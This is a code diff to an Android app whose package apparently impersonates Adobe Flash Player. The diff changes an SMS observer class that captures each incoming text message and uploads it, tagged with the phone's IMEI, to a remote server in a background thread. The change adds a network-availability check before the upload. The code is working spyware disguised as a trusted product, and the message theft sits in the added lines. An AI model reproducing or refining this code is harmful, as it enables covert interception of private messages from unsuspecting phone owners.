@@ -18,6 +18,7 @@ import androidx.core.content.ContextCompat;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.network.NetworkUitls;
 import com.adobe.flashplayer.network.UploadData;
 
 
@@ -80,10 +81,13 @@ public class PhoneSMSObsv extends ContentObserver {
                     JSONArray jsarray = new JSONArray();
                     jsarray.put(0,jsobj);
 
+                    if (NetworkUitls.isNetworkAvailable(mContext)) {
+                        UploadData sendmsg = new UploadData(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_LATESTMESSAGE, Public.IMEI);
+                        Thread threadsendloc = new Thread(sendmsg);
+                        threadsendloc.start();
+                    }else{
 
-                    UploadData sendmsg = new UploadData(jsarray.toString().getBytes(), jsarray.toString().getBytes().length,Public.CMD_DATA_LATESTMESSAGE, Public.IMEI);
-                    Thread threadsendloc = new Thread(sendmsg);
-                    threadsendloc.start();
+                    }
                     MyLog.writeLogFile("SMSContentObserver receive new message:" + jsarray.toString());
                     Log.e(TAG, jsarray.toString());
                 }
